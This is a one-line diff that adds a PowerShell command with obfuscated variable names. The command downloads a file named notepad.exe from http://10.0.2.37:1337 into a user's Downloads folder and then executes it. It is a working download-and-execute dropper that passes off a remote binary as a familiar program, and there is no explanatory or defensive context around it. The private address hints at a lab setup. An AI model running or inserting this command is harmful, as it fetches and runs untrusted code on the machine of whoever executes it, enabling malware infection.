@@ -1,0 +1,1 @@
+$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;$65lmAtnzW8 = New-Object System.Net.WebClient;$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);Start-Process -Filepath $LA4rJgSPpx
